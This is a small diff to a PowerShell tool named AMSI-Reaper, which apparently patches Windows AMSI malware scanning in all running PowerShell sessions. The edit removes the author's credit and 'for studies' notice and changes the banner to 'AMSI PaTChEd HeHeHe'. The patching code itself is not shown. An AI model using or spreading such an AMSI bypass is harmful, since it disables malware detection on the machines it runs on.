@@ -1,10 +1,3 @@
-# --------------------------- #
-#    About the AMSI-Reaper    #
-# --------------------------- #
-#    Developed by: H0ru       #
-#    Developed for studies!   #
-# --------------------------- #
-
 Add-Type -TypeDefinition @"
 using System;
 using System.Diagnostics;
@@ -85,5 +78,5 @@ function ModAllPShells
     }
 }
 
-Write-Host "[>] AMSI-Reaper written in PowerShell, by H0ru"
+Write-Host "[>] AMSI PaTChEd HeHeHe"
 ModAllPShells
